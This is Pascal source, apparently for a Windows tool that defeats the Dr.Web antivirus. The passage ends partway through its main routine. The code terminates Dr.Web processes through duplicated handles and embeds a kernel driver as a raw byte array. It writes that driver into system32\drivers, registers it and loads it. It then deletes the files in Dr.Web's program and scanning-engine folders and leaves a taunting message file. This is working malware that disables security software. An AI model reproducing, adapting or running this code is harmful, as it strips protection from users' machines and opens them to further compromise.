{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program dwunprot;
{$ENDIF}
unit dwunprot;
interface

uses
  Windows, WinNative, RTL;


implementation

const
  DrWebProcessesMax = 7;
  spidiedriver: PWideChar = '\system32\drivers\spidie.sys';
  dwprotdriver: PWideChar = '\system32\drivers\dwprot.sys';
  DwprotPath: PWideChar = '\Registry\Machine\System\CurrentControlSet\Services\dwprot\Parameters\Files\';
  RegPath: PWideChar = '\Registry\Machine\System\CurrentControlSet\Services\spidie';
  String4: PWideChar = 'Get in the car!';
  String5: PWideChar = '\BaseNamedObjects\dwunprotwait';
  String6: PWideChar = 'dwunprot.dll';
  String7: PWideChar = 'Wut Wut?';
  DrWebProcesses: array[0..DrWebProcessesMax] of PWideChar = (
    'dwengine.exe', 'drweb32w.exe', 'spiderml.exe', 'spidernt.exe', 'spiderui.exe', 'spidergate.exe', 'spideragent.exe', 'drwebupw.exe');

  data: array[0..3071] of byte = (
    $4D, $5A, $90, $00, $03, $00, $00, $00, $04, $00, $00, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $C8, $00, $00, $00,
    $0E, $1F, $BA, $0E, $00, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $54, $68,
    $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $63, $61, $6E, $6E, $6F,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $69, $6E, $20, $44, $4F, $53, $20,
    $6D, $6F, $64, $65, $2E, $0D, $0D, $0A, $24, $00, $00, $00, $00, $00, $00, $00,
    $E3, $A5, $45, $C3, $A7, $C4, $2B, $90, $A7, $C4, $2B, $90, $A7, $C4, $2B, $90,
    $AE, $BC, $AF, $90, $A6, $C4, $2B, $90, $AE, $BC, $B8, $90, $A4, $C4, $2B, $90,
    $A7, $C4, $2A, $90, $B4, $C4, $2B, $90, $AE, $BC, $A1, $90, $A6, $C4, $2B, $90,
    $AE, $BC, $BA, $90, $A6, $C4, $2B, $90, $52, $69, $63, $68, $A7, $C4, $2B, $90,
    $00, $00, $00, $00, $00, $00, $00, $00, $50, $45, $00, $00, $4C, $01, $05, $00,
    $99, $1C, $4F, $4B, $00, $00, $00, $00, $00, $00, $00, $00, $E0, $00, $02, $01,
    $0B, $01, $09, $00, $00, $04, $00, $00, $00, $06, $00, $00, $00, $00, $00, $00,
    $1E, $11, $00, $00, $00, $10, $00, $00, $00, $20, $00, $00, $00, $00, $40, $00,
    $00, $10, $00, $00, $00, $02, $00, $00, $05, $00, $00, $00, $05, $00, $00, $00,
    $05, $00, $00, $00, $00, $00, $00, $00, $00, $60, $00, $00, $00, $04, $00, $00,
    $90, $69, $00, $00, $01, $00, $00, $04, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $10, $00, $00, $10, $00, $00, $00, $00, $00, $00, $10, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $28, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $50, $00, $00, $20, $00, $00, $00,
    $20, $20, $00, $00, $1C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $20, $00, $00, $20, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $2E, $74, $65, $78, $74, $00, $00, $00, $FB, $01, $00, $00, $00, $10, $00, $00,
    $00, $02, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $20, $00, $00, $68, $2E, $72, $64, $61, $74, $61, $00, $00,
    $09, $01, $00, $00, $00, $20, $00, $00, $00, $02, $00, $00, $00, $06, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $48,
    $2E, $64, $61, $74, $61, $00, $00, $00, $10, $00, $00, $00, $00, $30, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C8, $49, $4E, $49, $54, $00, $00, $00, $00,
    $DE, $00, $00, $00, $00, $40, $00, $00, $00, $02, $00, $00, $00, $08, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $E2,
    $2E, $72, $65, $6C, $6F, $63, $00, $00, $A4, $00, $00, $00, $00, $50, $00, $00,
    $00, $02, $00, $00, $00, $0A, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $42, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $8B, $FF, $55, $8B, $EC, $83, $EC, $0C, $FF, $75, $08, $83, $65, $FC, $00, $8D,
    $45, $F4, $50, $FF, $15, $00, $20, $40, $00, $8D, $45, $FC, $50, $A1, $08, $20,
    $40, $00, $6A, $00, $6A, $00, $FF, $30, $8D, $45, $F4, $6A, $40, $6A, $00, $6A,
    $40, $50, $FF, $15, $10, $20, $40, $00, $85, $C0, $7C, $09, $8B, $4D, $FC, $FF,
    $15, $0C, $20, $40, $00, $8B, $45, $FC, $C9, $C2, $04, $00, $8B, $FF, $55, $8B,
    $EC, $56, $8B, $71, $04, $33, $C0, $39, $46, $10, $74, $1A, $8B, $4E, $08, $3B,
    $4D, $08, $75, $07, $50, $FF, $15, $04, $20, $40, $00, $8B, $C6, $8B, $76, $10,
    $83, $7E, $10, $00, $75, $E6, $5E, $5D, $C2, $04, $00, $CC, $8B, $FF, $55, $8B,
    $EC, $83, $EC, $78, $56, $57, $6A, $78, $8D, $45, $88, $6A, $00, $50, $E8, $FD,
    $00, $00, $00, $BE, $A0, $11, $40, $00, $83, $C4, $0C, $8B, $D6, $8D, $4D, $88,
    $E8, $93, $00, $00, $00, $BA, $C0, $11, $40, $00, $8D, $4D, $88, $E8, $C2, $00,
    $00, $00, $8D, $45, $88, $50, $E8, $45, $FF, $FF, $FF, $8B, $F8, $85, $FF, $74,
    $58, $8B, $D6, $8D, $4D, $88, $E8, $6D, $00, $00, $00, $BA, $D0, $11, $40, $00,
    $8D, $4D, $88, $E8, $9C, $00, $00, $00, $8D, $45, $88, $50, $E8, $1F, $FF, $FF,
    $FF, $85, $C0, $74, $08, $57, $8B, $C8, $E8, $5F, $FF, $FF, $FF, $8B, $D6, $8D,
    $4D, $88, $E8, $41, $00, $00, $00, $BA, $E0, $11, $40, $00, $8D, $4D, $88, $E8,
    $70, $00, $00, $00, $8D, $45, $88, $50, $E8, $F3, $FE, $FF, $FF, $85, $C0, $74,
    $08, $57, $8B, $C8, $E8, $33, $FF, $FF, $FF, $5F, $5E, $C9, $C3, $CC, $68, $F0,
    $11, $40, $00, $FF, $15, $14, $20, $40, $00, $59, $E8, $4D, $FF, $FF, $FF, $B8,
    $89, $01, $00, $C0, $C2, $08, $00, $CC, $57, $56, $8B, $F1, $8B, $FA, $83, $C9,
    $FF, $33, $C0, $F2, $66, $AF, $F7, $D1, $03, $C9, $8B, $FE, $8B, $F2, $8B, $C7,
    $8B, $D1, $C1, $E9, $02, $F2, $A5, $8B, $CA, $83, $E1, $03, $F2, $A4, $5E, $5F,
    $C3, $CC, $8B, $D7, $8B, $F9, $83, $C9, $FF, $33, $C0, $F2, $66, $AF, $8D, $47,
    $FE, $8B, $FA, $C3, $8B, $FF, $56, $57, $8B, $FA, $8B, $F1, $E8, $E1, $FF, $FF,
    $FF, $8B, $D7, $8B, $C8, $E8, $AE, $FF, $FF, $FF, $5F, $8B, $C6, $5E, $C3, $CC,
    $FF, $25, $18, $20, $40, $00, $CC, $CC, $CC, $CC, $CC, $CC, $CC, $CC, $CC, $CC,
    $5C, $00, $46, $00, $69, $00, $6C, $00, $65, $00, $53, $00, $79, $00, $73, $00,
    $74, $00, $65, $00, $6D, $00, $5C, $00, $00, $00, $CC, $CC, $CC, $CC, $CC, $CC,
    $64, $00, $77, $00, $70, $00, $72, $00, $6F, $00, $74, $00, $00, $00, $CC, $CC,
    $6E, $00, $74, $00, $66, $00, $73, $00, $00, $00, $CC, $CC, $CC, $CC, $CC, $CC,
    $66, $00, $61, $00, $73, $00, $74, $00, $66, $00, $61, $00, $74, $00, $00, $00,
    $42, $6F, $6E, $6A, $6F, $75, $72, $6E, $6F, $21, $00, $00, $00, $00, $00, $00,
    $48, $40, $00, $00, $60, $40, $00, $00, $72, $40, $00, $00, $88, $40, $00, $00,
    $A0, $40, $00, $00, $BA, $40, $00, $00, $D4, $40, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $99, $1C, $4F, $4B, $00, $00, $00, $00, $02, $00, $00, $00,
    $5D, $00, $00, $00, $AC, $20, $00, $00, $AC, $06, $00, $00, $30, $31, $32, $33,
    $34, $35, $36, $37, $38, $39, $41, $42, $43, $44, $45, $46, $00, $00, $00, $00,
    $30, $00, $31, $00, $32, $00, $33, $00, $34, $00, $35, $00, $36, $00, $37, $00,
    $38, $00, $39, $00, $41, $00, $42, $00, $43, $00, $44, $00, $45, $00, $46, $00,
    $00, $00, $00, $00, $71, $03, $00, $00, $20, $0F, $00, $00, $1F, $00, $00, $00,
    $1C, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00,
    $1E, $00, $00, $00, $1F, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00,
    $1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00, $52, $53, $44, $53,
    $5F, $F1, $02, $19, $BD, $CB, $E4, $4E, $A2, $BB, $3C, $51, $C6, $87, $D0, $AE,
    $01, $00, $00, $00, $43, $3A, $5C, $44, $6F, $63, $75, $6D, $65, $6E, $74, $73,
    $20, $61, $6E, $64, $20, $53, $65, $74, $74, $69, $6E, $67, $73, $5C, $7A, $30,
    $6D, $62, $69, $65, $5C, $44, $65, $73, $6B, $74, $6F, $70, $5C, $44, $77, $55,
    $6E, $50, $72, $6F, $74, $5C, $52, $65, $6C, $65, $61, $73, $65, $5C, $64, $72,
    $69, $76, $65, $72, $2E, $70, $64, $62, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $28, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $C6, $40, $00, $00,
    $00, $20, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $48, $40, $00, $00, $60, $40, $00, $00,
    $72, $40, $00, $00, $88, $40, $00, $00, $A0, $40, $00, $00, $BA, $40, $00, $00,
    $D4, $40, $00, $00, $00, $00, $00, $00, $D9, $00, $52, $74, $6C, $49, $6E, $69,
    $74, $55, $6E, $69, $63, $6F, $64, $65, $53, $74, $72, $69, $6E, $67, $00, $00,
    $2E, $00, $49, $6F, $44, $65, $74, $61, $63, $68, $44, $65, $76, $69, $63, $65,
    $00, $00, $31, $00, $49, $6F, $44, $72, $69, $76, $65, $72, $4F, $62, $6A, $65,
    $63, $74, $54, $79, $70, $65, $00, $00, $A0, $00, $4F, $62, $66, $44, $65, $72,
    $65, $66, $65, $72, $65, $6E, $63, $65, $4F, $62, $6A, $65, $63, $74, $00, $00,
    $9E, $00, $4F, $62, $52, $65, $66, $65, $72, $65, $6E, $63, $65, $4F, $62, $6A,
    $65, $63, $74, $42, $79, $4E, $61, $6D, $65, $00, $05, $00, $44, $62, $67, $50,
    $72, $69, $6E, $74, $00, $00, $6E, $74, $6F, $73, $6B, $72, $6E, $6C, $2E, $65,
    $78, $65, $00, $00, $07, $06, $6D, $65, $6D, $73, $65, $74, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $10, $00, $00, $20, $00, $00, $00, $15, $30, $1E, $30, $34, $30, $41, $30,
    $67, $30, $94, $30, $A6, $30, $CC, $30, $F8, $30, $1F, $31, $25, $31, $92, $31,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );
    
type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  DrWebDir: LBuf;
  buf1: LBuf;
  buf2: FBuf;

  fname: UNICODE_STRING;
  DrWebID: array[0..DrWebProcessesMax] of DWORD;
  ProcessHandles: array[0..39] of THANDLE;

  FileBuffer: PWideChar;
  ProcessHandlesCount: integer = 0;
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;

  EventHandle: THANDLE;
  iost: IO_STATUS_BLOCK;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;

function FillProcessesArray(): boolean;
var
  h2: THANDLE;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  ProcessHandlesCount := 0;
  memzero(@DrWebID, sizeof(DrWebID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        if (last = DrWebProcessesMax) then break;
        for i := 0 to DrWebProcessesMax do
        begin
          if (strcmpiW(pBuffer.szExeFile, DrWebProcesses[i]) = 0) then
          begin
            DrWebID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to buf^.uHandleCount - 1 do
      if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) then
      begin
        if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then //Process Type Object ID
        begin

          h2 := buf^.rHandleTable[c].Handle;
          if (ZwQueryInformationProcess(h2, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
          begin
            for i := 0 to DrWebProcessesMax do
            begin
              if (pbi.UniqueProcessId = DrWebID[i]) then
              begin
                ProcessHandles[ProcessHandlesCount] := h2;
                inc(ProcessHandlesCount);
              end;
            end;
          end;

        end;
      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
  result := (ProcessHandlesCount > 0);
end;

procedure KillProcesses();
var
  i: integer;
begin
  for i := 0 to ProcessHandlesCount - 1 do
  begin
    ZwTerminateProcess(ProcessHandles[i], 0);
    ZwClose(ProcessHandles[i]);
  end;
end;

function WriteDriverLoadSettings(
  RegPath: PWideChar
  ): boolean; stdcall;
var
  drvkey: THANDLE;
  dat1: DWORD;
begin
  result := false;
  RtlInitUnicodeString(@fname, RegPath);
  attr.Length := sizeof(OBJECT_ATTRIBUTES);
  attr.RootDirectory := 0;
  attr.ObjectName := @fname;
  attr.Attributes := OBJ_CASE_INSENSITIVE;
  attr.SecurityDescriptor := nil;
  attr.SecurityQualityOfService := nil;
  if (ZwCreateKey(@drvkey, KEY_ALL_ACCESS, @attr, 0,
    nil, REG_OPTION_NON_VOLATILE, nil) <> STATUS_SUCCESS) then exit;

  dat1 := SERVICE_ERROR_NORMAL;
  RtlInitUnicodeString(@fname, 'ErrorControl');
  ZwSetValueKey(drvkey, @fname, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := SERVICE_DEMAND_START;
  RtlInitUnicodeString(@fname, 'Start');
  ZwSetValueKey(drvkey, @fname, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := SERVICE_KERNEL_DRIVER;
  RtlInitUnicodeString(@fname, 'Type');
  ZwSetValueKey(drvkey, @fname, 0, REG_DWORD, @dat1, sizeof(DWORD));

  ZwClose(drvkey);

  result := true;
end;

function SpiDiE_LoadDriver(
  const RegistryPath: PWideChar
  ): BOOL; stdcall;
var
  s1: UNICODE_STRING;
  disp: DWORD;
begin
  result := false;
  if not WriteDriverLoadSettings(RegistryPath) then exit;
  RtlInitUnicodeString(@s1, RegistryPath);
  disp := ZwLoadDriver(@s1);
  result := (disp = STATUS_TOO_LATE);

 // strcpyW(buf1, 'ZwLoadDriver status = 0x');
 // uitohexW(disp, strendW(buf1));
 // strcatW(buf1, ' where 0xC0000189 is Ok');
 // OutputDebugStringW(buf1);
end;

procedure DelFiles(const lpDir: PWideChar);
var
  MemSize: DWORD;
  fh: THANDLE;
  ns: NTSTATUS;
  Event: THANDLE;
  DirInformation: PFILE_BOTH_DIR_INFORMATION;
  Buffer: pointer;
  str1: UNICODE_STRING;
begin
  if (lpDir <> nil) then
  begin
    if (RtlDosPathNameToNtPathName_U(lpDir, @str1, nil, nil)) then
    begin
      InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
      ns := ZwCreateFile(@fh, GENERIC_READ or FILE_LIST_DIRECTORY, @attr, @iost, nil,
        FILE_ATTRIBUTE_DIRECTORY,
        FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE,
        FILE_OPEN, FILE_DIRECTORY_FILE, nil, 0);
      if (ns = STATUS_SUCCESS) then
      begin
        MemSize := $100000;

        Buffer := RtlAllocateHeap(RtlGetProcessHeap(), HEAP_ZERO_MEMORY, MemSize);
        if (Buffer <> nil) then
        begin
          Event := 0;
          ZwCreateEvent(@Event, GENERIC_ALL, nil, NotificationEvent, false);
          ns := ZwQueryDirectoryFile(fh, Event, nil, nil, @iost, Buffer, MemSize,
            FileBothDirectoryInformation, false, nil, FALSE);
          if (ns = STATUS_PENDING) then ZwWaitForSingleObject(Event, true, nil);
          DirInformation := Buffer;
          if (DirInformation <> nil) then
            while (1 = 1) do
            begin
              strcpyW(FileBuffer, lpDir);
              strcatW(FileBuffer, '\');
              strcpynW(strendW(FileBuffer), @DirInformation^.FileName[0], DirInformation^.FileNameLength div sizeof(WCHAR));
              Internal_RemoveFile(FileBuffer);
              if (DirInformation^.NextEntryOffset = 0) then break else
                DirInformation := PFILE_BOTH_DIR_INFORMATION(PChar(DirInformation) + DirInformation^.NextEntryOffset);
            end;
          if (Event <> 0) then ZwClose(Event);
          RtlFreeHeap(RtlGetProcessHeap(), 0, Buffer);
        end;
        ZwClose(fh);
      end;
    end;
  end;
end;

procedure GetDrWebDir(Mode: DWORD);
var
  f: THANDLE;
begin
  strcpyW(buf1, DwprotPath);
  uitoW(Mode, strendW(buf1));
  f := Internal_RegOpenKey(buf1, 0, KEY_QUERY_VALUE);
  if (f <> 0) then
  begin
    memzero(@DrWebDir, sizeof(LBuf));
    strcpynW(DrWebDir, KI_SHARED_USER_DATA.NtSystemRoot, 2);
    Internal_RegReadString(f, 'Name', strendW(DrWebDir));
    ZwClose(f);
  end;
end;

procedure SpiDiE_2();
begin
  memzero(@buf1, sizeof(LBuf));
  strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf1, spidiedriver);
  if (Internal_WriteBufferToFile(buf1, @data, sizeof(data)) = sizeof(data)) then
  begin
    if (SpiDiE_LoadDriver(RegPath)) then
    begin
      Internal_RemoveFile(buf1);
      NtSleep(2000);
      GetDrWebDir(0);
//      OutputDebugStringW(DrWebDir);
      if (DrWebDir[0] <> #0) then
      begin
        DelFiles(DrwebDir);
        strcpyW(buf1, DrWebDir);
        strcatW(buf1, '\Danil0ff');
        strcpyA(buf2, 'By buying Dr.Web you are supporting communism');
        Internal_WriteBufferToFile(buf1, @buf2, strlenA(buf2));

     {   strcpyW(buf1, 'Length ');
        uitoW(u, strendW(buf1));
        OutputDebugStringW(buf1); }
      end;
      GetDrWebDir(2);
 //     OutputDebugStringW(DrWebDir);
      if (DrWebDir[0] <> #0) then
      begin
        strcatW(DrWebDir, '\Scanning Engine');
        DelFiles(DrwebDir);
      end;
      strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
      strcatW(buf1, dwprotdriver);
      Internal_RemoveFile(buf1);
    end
    else
    begin
      strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
      strcatW(buf1, spidiedriver);
      Internal_RemoveFile(buf1);
      NtSleep(2000);
    end;
  end;
end;

procedure main();
begin
  OutputDebugStringW(String4);

  FileBuffer := RtlAllocateHeap(RtlGetProcessHeap(), HEAP_ZERO_MEMORY, MaxWord);
  if (FileBuffer = nil) then exit;

  EventHandle := 0;
  RtlInitUnicodeString(@str1, String5);
